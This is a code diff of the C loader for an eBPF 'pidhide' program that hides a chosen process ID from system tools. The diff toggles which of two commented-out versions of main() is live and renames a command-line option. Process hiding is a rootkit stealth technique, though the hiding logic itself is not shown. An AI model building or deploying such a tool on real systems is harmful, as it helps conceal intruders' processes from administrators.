@@ -1,4 +1,4 @@
-/*#include <argp.h>
+#include <argp.h>
 #include <errno.h>
 #include <signal.h>
 #include <stdio.h>
@@ -9,8 +9,9 @@
 #include <sys/resource.h>
 #include <bpf/libbpf.h>
 #include <bpf/bpf.h>
-#include "pidhide.h"
 #include "pidhide.skel.h"
+#include "pidhide.h"
+//#include "pidhide.skel.h"
 
 
 static struct env {
@@ -30,7 +31,7 @@ const char argp_program_doc[] =
 
 
 static const struct argp_option opts[] = {
-    {"pid_to_hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide, Default to this program"},
+    {"pid-to-hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide, Default to this program"},
     {"target_ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children."},
     {},
 };
@@ -209,12 +210,12 @@ int main(int argc, char **agrv) {
 
 cleanup:
     pidhide__destroy(skel);
-    ring_buffer__free(rb);
+    //ring_buffer__free(rb);
     return -err;
-}*/
+}
 
 // SPDX-License-Identifier: BSD-3-Clause
-#include <argp.h>
+/*#include <argp.h>
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
@@ -442,9 +443,9 @@ int main(int argc, char **argv)
     printf("Hiding PID %d\n", env.pid_to_hide);
     while (!exiting)
     {
-        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
+        err = ring_buffer__poll(rb, 100 /* timeout, ms *///);
         /* Ctrl-C will cause -EINTR */
-        if (err == -EINTR)
+        /*if (err == -EINTR)
         {
             err = 0;
             break;
@@ -459,4 +460,4 @@ int main(int argc, char **argv)
 cleanup:
     pidhide__destroy(skel);
     return -err;
-}
+}*/
